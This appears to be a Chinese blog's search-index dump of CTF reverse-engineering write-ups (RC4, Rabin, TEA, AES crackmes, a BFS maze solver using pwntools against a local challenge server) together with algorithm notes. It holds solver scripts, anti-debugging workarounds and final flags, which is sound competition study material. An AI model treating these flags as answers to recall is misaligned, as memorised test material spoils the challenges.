[rbp-4h] __debugbreak(); for ( i = 0; i &lt;= 24; ++i ) &#123; v12 = 0; v11 = 0; v10 = 0; v9 = 1; while ( v12 &lt;= 24 ) &#123; if ( *(_BYTE *)(25 * i + v12 + a1) ) &#123; ++v11; v10 = 1; &#125; else &#123; if ( v10 ) &#123; *(_BYTE *)(a2 + 25LL * i + v9) = v11; v11 = 0; ++v9; &#125; v10 = 0; &#125; if ( ++v12 == 25 &amp;&amp; v10 ) &#123; *(_BYTE *)(a2 + 25LL * i + v9) = v11; v11 = 0; ++v9; &#125; &#125; result = (_BYTE *)(25LL * i + a2); *result = v9 - 1; &#125; for ( j = 0; j &lt;= 24; ++j ) &#123; v7 = 0; v6 = 0; v5 = 0; v4 = 1; while ( v7 &lt;= 24 ) &#123; if ( *(_BYTE *)(25 * v7 + j + a1) ) &#123; ++v6; v5 = 1; &#125; else &#123; if ( v5 ) &#123; *(_BYTE *)(a3 + 25LL * j + v4) = v6; v6 = 0; ++v4; &#125; v5 = 0; &#125; if ( ++v7 == 25 &amp;&amp; v5 ) &#123; *(_BYTE *)(a3 + 25LL * j + v4) = v6; v6 = 0; ++v4; &#125; &#125; result = (_BYTE *)(25LL * j + a3); *result = v4 - 1; &#125; __debugbreak(); return result;&#125; 是一个数织游戏 于是很明显我们RE3的主函数的对比数据不对，于是这时候就去init段还有个preinit段找 同样的手法是通过偏移来进行了混淆，手动计算即可，最后拿到真实数据 然后用网站解密 Nonogram (handsomeone.github.io) 还有一种动态调试： 强网杯2022-Reverse-easyre wp","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[{"name":"linux反调试","slug":"linux反调试","permalink":"http://example.com/tags/linux%E5%8F%8D%E8%B0%83%E8%AF%95/"}],"keywords":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}]},{"title":"搜索与图论","slug":"搜索与图论","date":"2022-07-25T16:00:00.000Z","updated":"2022-07-26T07:49:56.038Z","comments":true,"path":"2022/07/26/搜索与图论/","link":"","permalink":"http://example.com/2022/07/26/%E6%90%9C%E7%B4%A2%E4%B8%8E%E5%9B%BE%E8%AE%BA/","excerpt":"","text":"树与图的存储树是一种特殊的图，与图的存储方式相同。对于无向图中的边ab，存储两条有向边a-&gt;b, b-&gt;a。因此我们可以只考虑有向图的存储。 (1) 邻接矩阵：g[a][b] 存储边a-&gt;b (2) 邻接表： 123456789101112// 对于每个点k，开一个单链表，存储k所有可以走到的点。h[k]存储这个单链表的头结点int h[N], e[N], ne[N], idx;// 添加一条边a-&gt;bvoid add(int a, int b)&#123; e[idx] = b, ne[idx] = h[a], h[a] = idx ++ ;&#125;// 初始化idx = 0;memset(h, -1, sizeof h); DFS12345678910int dfs(int u)&#123; st[u] = true; // st[u] 表示点u已经被遍历过 for (int i = h[u]; i != -1; i = ne[i]) &#123; int j = e[i]; if (!st[j]) dfs(j); &#125;&#125; BFS12345678910111213141516171819queue&lt;int&gt; q;st[1] = true; // 表示1号点已经被遍历过q.push(1);while (q.size())&#123; int t = q.front(); q.pop(); for (int i = h[t]; i != -1; i = ne[i]) &#123; int j = e[i]; if (!st[j]) &#123; st[j] = true; // 表示点j已经被遍历过 q.push(j); &#125; &#125;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[],"keywords":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}]},{"title":"DAS七月赛","slug":"DAS七月赛","date":"2022-07-25T06:23:13.740Z","updated":"2022-07-25T12:13:57.502Z","comments":true,"path":"2022/07/25/DAS七月赛/","link":"","permalink":"http://example.com/2022/07/25/DAS%E4%B8%83%E6%9C%88%E8%B5%9B/","excerpt":"","text":"隐秘的角落加密后的数据在init函数有异或0x23的操作，是rc4加密 12345678910111213141516171819202122232425262728293031323334import base64def rc4_main(key, message): s_box = rc4_init_sbox(key) crypt = rc4_excrypt(message, s_box) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_boxdef rc4_excrypt(plain, box): res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(s ^ k)) for i in range (len(res)): print(res[i],end=&#x27;&#x27;) return res#a=[0xE0,0xB2,0x5F,0x3D,0x8F,0xFA,0x94,0xB6,0xE7,0x9D,0x6C,0x98,0x66,0xD2,0x0F,0xEA,0x6D,0x6F,0xBE,0xC5,0x71,0x40,0x08,0x1B,0xF6,0xF3,0xBD,0xA8,0x8D,0x09,0x7B,0x7C]a = [251, 198, 166, 157, 196, 219, 123, 86, 182, 70, 166, 192, 133, 100, 122, 154, 55, 76, 16, 150, 233, 167, 40, 196, 177, 45, 241, 222, 71, 59, 181, 243, 44, 125, 103, 29]rc4_main(&quot;thisiskkk&quot;,a) 得到56e83694-f976-11eb-b343-faffc201c8e0 再md5加密小写就是flag ezGogo题一些陌生的函数以及奇怪的变量配合动调体验更加 这里的循环的作用主要是把输入的40个字符的ASCII码拼接成一个大整数 然后就是平方取余比较 加密就是如下$$c&#x3D;m^2modn$$一种特殊的RSA加密形式，用rabnin算法解 用yafu分解大质数，可以发现这两个质数都是模四余三，根据e&#x3D;2可知，这是一个rabin算法。 12345678910111213141516171819202122import libnumimport gmpy2#导入公钥n=131453094564548508772284336424680998857035326273571981446094083416917514535349876760437096547435610190391556347148927592380050533193934285571983556924577144473815598516557161e = 2c=33529281532734294938614341047870321616766628114182320093600990983456360122704185955921012051918080449587733939007294096845300395098833835443815283246602601870001850089370636#n 在线分解p=17489158711316178659q=7516261744453902635364442762653073356746063224482072262455102025715350278471780391042196223686233375846890331396948280463168691132631674699134296333350979inv_p = gmpy2.invert(p, q)inv_q = gmpy2.invert(q, p)mp = pow(c, (p + 1) // 4, p)mq = pow(c, (q + 1) // 4, q)a = (inv_p * p * mq + inv_q * q * mp) % nb = n - int(a)c = (inv_p * p * mq - inv_q * q * mp) % nd = n - int(c)#因为rabin 加密有四种结果，全部列出。aa=[a,b,c,d]for i in aa: # print(i) print(libnum.n2s(int(i))) 得到flag：DASCTF{48fa8aa2b489e9adac1750ea16ddc7b5} fantansic maze sha256爆破 自动化路径求解 bfs算法 首先是常规的sha256爆破 过了proof之后题目会给出远程程序的base64编码，将编码解码后写入文本再拖入IDA查看 其中有1000个相似的函数，其汇编代码大致如下(这里IDA F5看不出来啥东西) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556.text:0000000000001358 function_0 proc near ; CODE XREF: function_36+85↓p.text:0000000000001358 ; function_201+67↓p ....text:0000000000001358 ; __unwind &#123;.text:0000000000001358 endbr64.text:000000000000135C push rbp.text:000000000000135D mov rbp, rsp.text:0000000000001360 sub rsp, 10h.text:0000000000001364 mov eax, cs:tmp.text:000000000000136A add eax, 1.text:000000000000136D mov cs:tmp, eax.text:0000000000001373 lea rdi, aStep1 ; &quot;step1:&quot;.text:000000000000137A call sub_10C0.text:000000000000137F mov eax, 0.text:0000000000001384 call read_num.text:0000000000001389 mov [rbp-4], eax.text:000000000000138C cmp dword ptr [rbp-4], 0Ah.text:0000000000001390 ja loc_141E.text:0000000000001396 mov eax, [rbp-4].text:0000000000001399 lea rdx, ds:0[rax*4].text:00000000000013A1 lea rax, unk_3501C.text:00000000000013A8 mov eax, [rdx+rax].text:00000000000013AB cdqe.text:00000000000013AD lea rdx, unk_3501C.text:00000000000013B4 add rax, rdx.text:00000000000013B7 db 3Eh.text:00000000000013B7 jmp rax.text:00000000000013BA ; ---------------------------------------------------------------------------.text:00000000000013BA mov eax, 0.text:00000000000013BF call function_541.text:00000000000013C4 mov eax, 0.text:00000000000013C9 call function_205.text:00000000000013CE mov eax, 0.text:00000000000013D3 call function_297.text:00000000000013D8 mov eax, 0.text:00000000000013DD call function_175.text:00000000000013E2 mov eax, 0.text:00000000000013E7 call function_331.text:00000000000013EC mov eax, 0.text:00000000000013F1 call function_287.text:00000000000013F6 mov eax, 0.text:00000000000013FB call function_938.text:0000000000001400 mov eax, 0.text:0000000000001405 call function_413.text:000000000000140A mov eax, 0.text:000000000000140F call function_934.text:0000000000001414 mov eax, 0.text:0000000000001419 call function_1000.text:000000000000141E.text:000000000000141E loc_141E: ; CODE XREF: function_0+38↑j.text:000000000000141E mov eax, 0.text:0000000000001423 call main.text:0000000000001428 nop.text:0000000000001429 leave.text:000000000000142A retn.text:000000000000142A ; &#125; // starts at 1358.text:000000000000142A function_0 endp 转换为伪代码大致如下 123456789tmp++;switch(read_num())&#123; case &quot;1&quot;: function_541(); case &quot;2&quot;: function_205(); ..... case &quot;10&quot; function_1000(); default: main();&#125; 从function_0 ~ function_999都能跳转到其它的十个函数，我们的目标是要在第1000步的时候走到function_1000从而获得flag 但是这里可以发现在每一个switch内只要default就会返回main函数，那么我们其实只需要找到一条长度小于1000的路径，然后一直default去填充tmp就好了 寻找最短路径可以采用bfs算法，那我们只需要知道1000个函数每个函数可以跳转到那些函数就好了，但是由于每一次的maze都是随机生成的且超过20秒就会直接Alarm clock,所以我们不能通过IDA来直观的得知程序的构造，而是需要我们手动分析hex view来得到程序的构造 分析Hex View主要分析的就是call指令 call指令占5个字节,如00000000000013BF call function_541 在 Hex View 中为\\x00\\x01\\xbd\\x7b\\xe8(这里为大端序), \\xe8可以理解为标志位,\\x00\\x01\\xbd\\x7b为地址到跳转函数的00000000000013BF偏移,而这里每一个函数的偏移为0xd3，这里就可以通过偏移来算出call指令所指向的函数 这里得注意下这里得偏移是有符号数，所以在计算的时候需要将其转换 最后，在得到表之后，用bfs算法得到路径，最后得到flag 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#!/usr/bin/python3from pwn import *import randomimport sysfrom hashlib import sha256p = remote(&quot;127.0.0.1&quot;,1447)def pass_proof(): dir = string.ascii_letters + string.digits #生成24个字母和十个数 p.recvuntil(&#x27;[+] sha256(XXXX+&#x27;) salt = p.recv(16).strip().decode()#strip() 方法用于移除字符串头尾指定的字符（/n) #decode() 方法以 encoding 指定的编码格式解码字符串。默认编码为字符串编码。 p.recvuntil(&#x27;) == &#x27;) hash = p.recv(64).strip().decode() while True: rand_str = (&#x27;&#x27;.join([random.choice(dir) for _ in range(4)])) + salt if sha256(rand_str.encode()).hexdigest() == hash: print(rand_str[:4]) p.sendlineafter(&#x27;[+] Plz Tell Me XXXX :&#x27;, rand_str[:4]) breakdef get_elf(): p.recvuntil(&quot;map :\\n&quot;) data=p.recvuntil(&#x27;That\\&#x27;s all\\n&#x27;,drop=True)[:-1] data=base64.b64decode(data) fd=open(&#x27;pwnpwn&#x27;,&#x27;wb&#x27;) fd.write(data) fd.close()pass_proof()get_elf()fd = open(&quot;./pwnpwn&quot;,&quot;rb&quot;)offset = 0x13C0def get_map(fd,offset): Map = [] for i in range(1000): addr = offset for j in range(10): fd.seek(addr) fc = u64(fd.read(4).ljust(8,b&#x27;\\x00&#x27;)) if fc &lt;= 0x33765: #整个迷宫函数的长度 fc = fc//0xd3 + i + 1 #oxd3是func度 else: fc = fc - 0x100000000 if fc &gt; -0xd3: fc = i else: if addr+fc &lt; 0x134A: #func1000 fc = 1000 else: fc = fc//0xd3 fc = i+1+fc Map.append(fc) addr += 0xa #case的长度 offset += 0xd3 return MapMap = get_map(fd,offset)def do_bfs(Map): values = [] keys = [] for y in range(1000): for x in range(10): if x == 0: values.append([]) values[y].append(Map[x + y * 10]) for i in range(1000): keys.append(i) result = dict(zip(keys,values)) #两个列表合并成一个字典 result[1000] = &quot;&quot; #print(result) result1 = None q = [(0,&#x27;&#x27;)] check_map = &#123;&#125; while len(q): f = q[0] q = q[1:] if f[0] == 1000: result1 = f[1] break if f[0] not in check_map: check_map[f[0]] = f[1] for i in range(10): if result[f[0]][i] not in check_map: q.append((result[f[0]][i],f[1]+str(i))) return result1result = do_bfs(Map)print(result)result = str(result)times = 999 - len(result)for i in range(times): p.sendline(&quot;11&quot;)for i in range(len(result)): p.sendline(str(int(result[i])+1))","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-DAS","slug":"DAS","permalink":"http://example.com/tags/DAS/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"FFunction","slug":"FFunction","date":"2022-07-18T13:47:05.000Z","updated":"2022-07-18T15:25:52.318Z","comments":true,"path":"2022/07/18/FFunction/","link":"","permalink":"http://example.com/2022/07/18/FFunction/","excerpt":"","text":"ida打开my_plugin.dll 在my_plugin.dll的f函数断下，f函数先将第⼀个参数的数值分成2个word，然后tea加密并与第⼆个参数的值⽐较。 第⼀个参数的值是输⼊经过位置变换然后base64 第二个参数 12[+] Dump 0x1ECA101B060 - 0x1ECA101B0B0 (80 bytes) :[0x5C15754C, 0xD1D781E7, 0x501BF173, 0xCB4DB222, 0x215D61F5, 0x3FCA9EE7, 0x7C76B5C7, 0xC7DD8CB9, 0x990D23FA, 0x0BAB1AD3, 0x8E12C932, 0xD307BAF2, 0xE52DD123, 0xFBB68F2C, 0xBDD853E3, 0x892E1E4E, 0x39DD66FA, 0x87FEEC65, 0x307C5E60, 0x340C6C00] tea解密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;windows.h&gt;void Decrypt(UINT32 *v, UINT32 *k)&#123; unsigned long n = 32, sum, y = v[0], z = v[1]; unsigned long delta = 0x79B99E37; sum = delta &lt;&lt; 5; while (n-- &gt; 0) &#123; z += ((y &lt;&lt; 4) + k[2]) ^ (y + sum) ^ ((y &gt;&gt; 5) + k[3]); y += ((z &lt;&lt; 4) + k[0]) ^ (z + sum) ^ ((z &gt;&gt; 5) + k[1]); sum -= delta; &#125; v[0] = y; v[1] = z;&#125;int main()&#123; UINT32 key[4] = &#123;0x0BABEC0FE, 0x0DEADBEEF, 0x0FACEB00C, 0xDEADC0DE&#125;; UINT32 enc[21] = &#123;1544910156, 3520561639, 1344008563, 3410866722, 559768053, 1070243559, 2088154567, 3353185465, 2567775226, 195762899, 2383595826, 3540499186, 3844985123, 4223045420, 3185071075, 2301501006, 970811130, 2281630821, 813456992, 873229312, 0&#125;; Decrypt(enc, key); Decrypt(enc + 2, key); Decrypt(enc + 4, key); Decrypt(enc + 6, key); Decrypt(enc + 8, key); Decrypt(enc + 10, key); Decrypt(enc + 12, key); Decrypt(enc + 14, key); Decrypt(enc + 16, key); Decrypt(enc + 18, key); Decrypt(enc + 20, key); for (int i = 0; i &lt; 20 * 4; i++) &#123; printf(&quot;%02x&quot;, ((char *)enc)[i]); &#125; &#125; 再经过base64解码 1234567891011import base64a=&quot;30014006400460044007500230035008600c400a600e6003600c300930016004300340025004400d7007500250086002600f5006300050083007400e3000500a600840055007400970033001600e500a&quot;import reccc=re.findall(&quot;.&#123;2&#125;&quot;,a)ccc=[int(i,16) for i in ccc]fl=&quot;&quot;for index in range(0,len(ccc),2): fl+=(chr(ccc[index]+ccc[index+1]))print(fl[::-1])print(base64.b64decode(fl[::-1]).decode()) 还原 12345678910flag=&quot;f&#125;l!a!gC&#123;_Ehmtp10ww_erre_tFt1u&quot;print(len(flag))f1=&quot;&quot;f2=&quot;&quot;for index in range(len(flag)): if index%2==0: f1+=flag[index] else: f2+=flag[index]print(f1+f2) 1flag&#123;Emp0wer_F1&#125;!!C_ht1w_rettu 再把后部分逆序 1flag&#123;Emp0wer_F1utter_w1th_C!!&#125; 参考dsctf2022 wp - FW_ltlly - 博客园 (cnblogs.com)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[dll]","slug":"dll","permalink":"http://example.com/tags/dll/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"catchme","slug":"catchme","date":"2022-07-18T04:17:01.000Z","updated":"2022-07-18T04:42:01.542Z","comments":true,"path":"2022/07/18/catchme/","link":"","permalink":"http://example.com/2022/07/18/catchme/","excerpt":"","text":"主要check函数在native层里面 ida打开so文件,findcrypto找到aes加密，定位到主要加密函数 sub_B2A4 先是一个aes然后是base64 很多的反调试，但是可以直接静态解，aes的key和最后的比较函数都经过异或加密 加密函数datadiv_decode2726420793510661260() 123456789a=[0x4F, 0x1C, 0x36, 0x49, 0x09, 0x3A, 0x3F, 0x07, 0x4D, 0x3D, 0x22, 0x39, 0x00, 0x0A, 0x22, 0x25, 0x06, 0x09, 0x01, 0x20, 0x4A, 0x1B, 0x51, 0x51, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]for i in range(len(a)): a[i]^=0x6C print(chr(a[i]),end=&#x27;&#x27;)print(&#x27; &#x27;)b=[0x24, 0x3C, 0x3D, 0x37, 0x36, 0x21, 0x35, 0x26, 0x3F, 0x37, 0x32, 0x2A, 0x72, 0x72, 0x72, 0x72, 0x53, 0x00]for i in range(len(b)): b[i]^=0x53 print(chr(b[i]),end=&#x27;&#x27;) 比较的字符串：#pZ%eVSk!QNUlfNIjemL&amp;w&#x3D;&#x3D; aes的密钥：wonderfulday!!!! 解密得到flag flag{weu&#x2F;.,iopl}","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[native] -[android]","slug":"native-android","permalink":"http://example.com/tags/native-android/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"LOADER","slug":"LOADER","date":"2022-07-14T01:21:57.000Z","updated":"2022-07-14T08:33:05.545Z","comments":true,"path":"2022/07/14/LOADER/","link":"","permalink":"http://example.com/2022/07/14/LOADER/","excerpt":"","text":"64位无壳 123456BOOL VirtualProtect( LPVOID lpAddress, // 目标地址起始位置 DWORD dwSize, // 大小 DWORD flNewProtect, // 请求的保护方式 PDWORD lpflOldProtect // 保存老的保护方式); VirtualProtectEx函数可以改变在特定进程中内存区域的保护属性。 独立了一个新的虚拟内存，权限可读可写可执行，作为后面新程序的一个引导，根据后面给的内存地址，将被引导的程序dump下来 无法正常运行，文件头存在问题。（主程序是64位但是文件头 这里修改文件头和可选头的值 主要逻辑为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214int sub_BF2850()&#123; FILE *v0; // rax __int64 v1; // rax _QWORD *v2; // rsi __int64 v3; // rdi __int64 v4; // rdx __int64 v5; // rbx __m128i *v6; // rax __m128i *v7; // rdi __m128i *v8; // rax unsigned __int64 *v10; // rsi __int64 v11; // rbx __int64 v12; // rcx __m128i *input_1; // rbp __int64 v14; // rdx unsigned __int64 v15; // rdi __int64 v16; // rbx unsigned __int64 *len; // rbp __m128i *v18; // rax __int64 v19; // rcx __m128i *input_2; // rdi __int64 v21; // rdx unsigned __int64 v22; // rsi __int64 v23; // rdi __int64 v24; // rdx unsigned __int64 v25; // rcx __m128i v26; // xmm4 __int64 v27; // rdi __int64 v28; // rdx unsigned __int64 v29; // rcx __m128i v30; // [rsp+20h] [rbp-78h] BYREF __m128i v31; // [rsp+30h] [rbp-68h] BYREF __int64 v32; // [rsp+40h] [rbp-58h] BYREF __int64 v33; // [rsp+48h] [rbp-50h] __m128i v34; // [rsp+50h] [rbp-48h] BYREF __int64 v35; // [rsp+60h] [rbp-38h] BYREF __int64 v36; // [rsp+68h] [rbp-30h] nimRegisterGlobalMarker(sub_BF27A0); nimRegisterGlobalMarker(sub_BF2790); nimRegisterGlobalMarker(sub_BF2780); nimRegisterGlobalMarker(sub_BF2770); nimRegisterGlobalMarker(sub_BF2760); nimRegisterGlobalMarker(sub_BF2750); nimRegisterGlobalMarker(sub_BF2740); nimRegisterGlobalMarker(sub_BF2730); nimRegisterGlobalMarker(sub_BF2720); printf_0(off_BF6DC8, 1i64); v0 = (FILE *)off_BF50C0(0i64); v1 = scanf(v0); v2 = (_QWORD *)v1; if ( v1 ) *(_QWORD *)(v1 - 16) += 8i64; if ( input ) &#123; v3 = *(_QWORD *)(input - 16); v4 = input - 16; *(_QWORD *)(input - 16) = v3 - 8; if ( (unsigned __int64)(v3 - 8) &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v4); &#125; input = (__int64)v2; v5 = 0i64; v6 = sub_BE8FC0(5i64); v7 = v6; if ( !v6 ) &#123; if ( v2 ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; if ( !v2 ) &#123; if ( !v6-&gt;m128i_i64[0] ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; do &#123; if ( v6-&gt;m128i_i64[0] &lt;= (unsigned __int64)v5 ) sub_BEC420(v5, v6-&gt;m128i_i64[0] - 1); if ( *v2 &lt;= (unsigned __int64)v5 ) sub_BEC420(v5, *v2 - 1i64); v6[1].m128i_i8[v5] = *((_BYTE *)v2 + v5 + 16); ++v5; &#125; while ( v5 &lt;= 4 ); if ( v6-&gt;m128i_i64[0] != 5 ) goto error; v8 = v6 + 1; if ( v7[1].m128i_i32[0] != &#x27;galf&#x27; ) //判断输入是否为flag goto error; if ( v8-&gt;m128i_i8[4] != &#x27;&#123;&#x27; ) goto error; v10 = (unsigned __int64 *)input; if ( !input || *(_QWORD *)input != 42i64 || *(_BYTE *)(input + 57) != &#x27;&#125;&#x27; )// 判断长度为42位 并且最后一位是&#125; goto error; v11 = 0i64; input_1 = sub_BE8FC0(18i64); if ( !input_1 ) sub_BEC420(0i64, -1i64); do &#123; v14 = input_1-&gt;m128i_i64[0]; if ( input_1-&gt;m128i_i64[0] &lt;= (unsigned __int64)v11 ) sub_BEC420(v11, v14 - 1); // 跳过 v15 = v11 + 5; if ( v11 + 5 &lt; 0 || v15 &lt; v11 ) sub_BE7F70(v12, v14); // 跳过 if ( *v10 &lt;= v15 ) sub_BEC420(v11 + 5, *v10 - 1); // 跳过 input_1[1].m128i_i8[v11++] = *((_BYTE *)v10 + v15 + 16);// 保存我们输入后去除flag&#123;的后18位 &#125; while ( v11 &lt;= 17 ); v16 = 0i64; str2int(input_1, 10i64, &amp;ll_input_1); //将我们的输入转换为了无符号的long long类型的一个数据 len = (unsigned __int64 *)input; v18 = sub_BE8FC0(18i64); input_2 = v18; if ( !v18 ) &#123; if ( len ) sub_BEC420(0i64, -1i64); sub_BEC420(0i64, -1i64); &#125; if ( !len ) &#123; if ( !v18-&gt;m128i_i64[0] ) sub_BEC420(0i64, -1i64); sub_BEC420(23i64, -1i64); &#125; do &#123; v21 = input_2-&gt;m128i_i64[0]; if ( input_2-&gt;m128i_i64[0] &lt;= (unsigned __int64)v16 ) sub_BEC420(v16, v21 - 1); v22 = v16 + 23; if ( v16 + 23 &lt; 0 || v22 &lt; v16 ) sub_BE7F70(v19, v21); if ( *len &lt;= v22 ) sub_BEC420(v16 + 23, *len - 1); input_2[1].m128i_i8[v16++] = *((_BYTE *)len + v22 + 16);// 保存后18位 &#125; while ( v16 &lt;= 17 ); str2int(input_2, 10i64, &amp;ll_input_2); str2int(qword_BF6D80, 10i64, &amp;xmmword_C0C150); str2int(qword_BF6D40, 10i64, &amp;max_num); v31 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C150); //大致可以猜测_mm_lodau_si128是将后面的偏移地址处的数据进行加载，那么可以猜测在这个前后应该会有加密部分 v30 = _mm_loadu_si128((const __m128i *)&amp;ll_input_1); if ( !(unsigned __int8)check(&amp;v31, &amp;v30) ) goto error; v31 = _mm_loadu_si128((const __m128i *)&amp;ll_input_1); v30 = _mm_loadu_si128((const __m128i *)&amp;max_num); if ( !(unsigned __int8)check(&amp;v31, &amp;v30) ) goto error; v32 = 0i64; v33 = 0i64; v31 = (__m128i)ll_input_1; v30 = (__m128i)ll_input_1; func_sqr(&amp;v31, &amp;v30, &amp;v32); v23 = v32; if ( v32 ) *(_QWORD *)(v32 - 16) += 8i64; if ( (_QWORD)xmmword_C0C190 ) &#123; v24 = xmmword_C0C190 - 16; v25 = *(_QWORD *)(xmmword_C0C190 - 16) - 8i64; *(_QWORD *)(xmmword_C0C190 - 16) = v25; if ( v25 &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v24); &#125; *(_QWORD *)&amp;xmmword_C0C190 = v23; v34 = 0ui64; BYTE8(xmmword_C0C190) = v33; v31 = (__m128i)ll_input_2; v30 = (__m128i)ll_input_2; func_sqr(&amp;v31, &amp;v30, &amp;v34); v26 = _mm_load_si128(&amp;v34); v35 = 0i64; v36 = 0i64; v31 = v26; func_mul(&amp;v31, 11i64, &amp;v35); v27 = v35; if ( v35 ) *(_QWORD *)(v35 - 16) += 8i64; if ( (_QWORD)xmmword_C0C120 ) &#123; v28 = xmmword_C0C120 - 16; v29 = *(_QWORD *)(xmmword_C0C120 - 16) - 8i64; *(_QWORD *)(xmmword_C0C120 - 16) = v29; if ( v29 &lt;= 7 ) addZCT__Y66tOYFjgwJ0k4aLz4bc0Q(&amp;qword_C01F80 + 3, v28); &#125; *(_QWORD *)&amp;xmmword_C0C120 = v27; v31 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C190); BYTE8(xmmword_C0C120) = v36; v30 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C120); sub_BF23C0(&amp;v31, &amp;v30, &amp;num_9); str2int(qword_BF6D10, 10i64, &amp;xmmword_C0C180); v31 = _mm_loadu_si128((const __m128i *)&amp;num_9); v30 = _mm_loadu_si128((const __m128i *)&amp;xmmword_C0C180); if ( (unsigned __int8)sub_BF2500(&amp;v31, &amp;v30) ) &#123; qword_BFA660 = 1i64; &#125; else &#123;error: if ( qword_BFA660 != 1 ) return printf_0(off_BF6CC0, 1i64); &#125; return printf_0(win, 1i64);&#125; $$input1^2-11*(input^2)&#x3D;9$$ 大致流程为输入42位的flag。去除flag{}后分为两个18位的数进行上述运算 采用：www.wolframalpha.com/ 进行求解 y是17位前面补上0得到 1flag&#123;118936021352508390035860559716724409&#125;","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"算法-数据结构","slug":"算法-数据结构","date":"2022-07-12T00:05:12.000Z","updated":"2022-07-23T12:53:44.312Z","comments":true,"path":"2022/07/12/算法-数据结构/","link":"","permalink":"http://example.com/2022/07/12/%E7%AE%97%E6%B3%95-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","excerpt":"","text":"链表（数组模拟）new一个结构体效率很低 单链表 邻接表为主（存储数和图） 123456789101112131415161718192021// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点int head, e[N], ne[N], idx;// 初始化void init()&#123; head = -1; idx = 0;&#125;// 在链表头插入一个数avoid insert(int a)&#123; e[idx] = a, ne[idx] = head, head = idx ++ ;&#125;// 将头结点删除，需要保证头结点存在void remove()&#123; head = ne[head];&#125; 双链表 优化某些问题 12345678910111213141516171819202122232425// e[]表示节点的值，l[]表示节点的左指针，r[]表示节点的右指针，idx表示当前用到了哪个节点int e[N], l[N], r[N], idx;// 初始化void init()&#123; //0是左端点，1是右端点 r[0] = 1, l[1] = 0; idx = 2;&#125;// 在节点a的右边插入一个数xvoid insert(int a, int x)&#123; e[idx] = x; l[idx] = a, r[idx] = r[a]; l[r[a]] = idx, r[a] = idx ++ ;&#125;// 删除节点avoid remove(int a)&#123; l[r[a]] = l[a]; r[l[a]] = r[a];&#125; 栈1234567891011121314151617// tt表示栈顶int stk[N], tt = 0;// 向栈顶插入一个数stk[ ++ tt] = x;// 从栈顶弹出一个数tt -- ;// 栈顶的值stk[tt];// 判断栈是否为空if (tt &gt; 0)&#123;&#125; 单调栈 1234567常见模型：找出每个数左边离它最近的比它大/小的数int tt = 0;for (int i = 1; i &lt;= n; i ++ )&#123; while (tt &amp;&amp; check(stk[tt], i)) tt -- ; stk[ ++ tt] = i;&#125; 队列普通队列 1234567891011121314151617// hh 表示队头，tt表示队尾int q[N], hh = 0, tt = -1;// 向队尾插入一个数q[ ++ tt] = x;// 从队头弹出一个数hh ++ ;// 队头的值q[hh];// 判断队列是否为空if (hh &lt;= tt)&#123;&#125; 循环队列 12345678910111213141516171819// hh 表示队头，tt表示队尾的后一个位置int q[N], hh = 0, tt = 0;// 向队尾插入一个数q[tt ++ ] = x;if (tt == N) tt = 0;// 从队头弹出一个数hh ++ ;if (hh == N) hh = 0;// 队头的值q[hh];// 判断队列是否为空if (hh != tt)&#123;&#125; 单调队列 12345678常见模型：找出滑动窗口中的最大值/最小值int hh = 0, tt = -1;for (int i = 0; i &lt; n; i ++ )&#123; while (hh &lt;= tt &amp;&amp; check_out(q[hh])) hh ++ ; // 判断队头是否滑出窗口 while (hh &lt;= tt &amp;&amp; check(q[tt], i)) tt -- ; q[ ++ tt] = i;&#125; KMP字符串匹配算法核心思想：在每次失配时，不是把p串往后移一位，而是把p串往后移动至下一次可以和前面部分匹配的位置，这样就可以跳过大多数的失配步骤。而每次p串移动的步数就是通过查找next[ ]数组确定的。 “非平凡前缀”：指除了最后一个字符以外，一个字符串的全部头部组合。“非平凡后缀”：指除了第一个字符以外，一个字符串的全部尾部组合（简称前后缀） next数组的含义：对next[ j ] ，是p[ 1, j 